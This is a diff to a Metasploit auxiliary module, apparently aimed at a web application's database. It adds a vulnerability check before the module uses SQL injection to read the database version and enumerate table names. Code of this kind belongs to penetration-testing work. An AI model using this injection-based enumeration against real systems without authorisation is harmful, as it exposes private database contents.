@@ -122,12 +122,15 @@ class MetasploitModule < Msf::Auxiliary
         ''
       end
     end
+    unless sqli.test_vulnerable
+      fail_with Failure::NotVulnerable, 'The target does not seem vulnerable.'
+    end
+    print_good "The target seems vulnerable."
     db_version = sqli.version
     print_status("DB Version: #{db_version}")
     print_status('Enumerating tables, this may take a moment...')
     tables = sqli.enum_table_names('database()')
     num_tables = tables.length
-    # same as sqli.run_sql("select count(1) from information_schema.tables where table_schema=database()")
     print_status("Identified #{num_tables} tables.")
     # These tables are impossible to fetch because they increase each request
     skiptables = %w[form_taskman log log_comment_encrypt]
